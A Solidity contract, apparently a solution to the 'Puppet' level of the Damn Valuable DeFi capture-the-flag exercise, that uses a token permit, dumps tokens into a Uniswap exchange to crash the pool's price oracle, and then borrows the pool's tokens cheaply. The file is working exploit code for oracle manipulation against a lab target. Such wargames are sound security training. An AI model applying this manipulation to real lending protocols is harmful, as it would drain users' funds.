// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

contract PuppetAttacker {
    constructor(PuppetPool pool, DamnValuableToken token, address uniswapExchange, address owner,
        uint256 amount, uint256 outputEth, uint256 borrowAmount, bytes32 r, bytes32 s, uint8 v) payable {
        token.permit(owner, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(owner, address(this), amount);
        token.approve(uniswapExchange, amount);
        bytes memory attackCallData = abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", amount, outputEth, block.timestamp * 2);
        uniswapExchange.call(attackCallData);
        pool.borrow{value: address(this).balance}(borrowAmount, owner);
    }

    receive() external payable  {}
}